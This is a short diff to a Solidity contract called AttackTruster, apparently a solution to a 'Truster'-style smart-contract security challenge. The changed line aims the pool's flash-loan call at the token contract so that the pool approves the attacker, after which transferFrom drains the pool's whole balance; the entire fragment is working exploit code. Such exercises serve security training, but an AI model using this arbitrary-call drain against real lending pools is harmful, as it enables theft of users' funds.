@@ -11,7 +11,7 @@ contract AttackTruster {
 
         bytes memory approvePayload = abi.encodeWithSignature("approve(address, uint256)", address(this), poolBalance);
 
-        pool.flashLoan(0, msg.sender, address(pool), approvePayload);
+        pool.flashLoan(0, msg.sender, address(token), approvePayload);
 
         token.transferFrom(address(pool), msg.sender, poolBalance);
     }
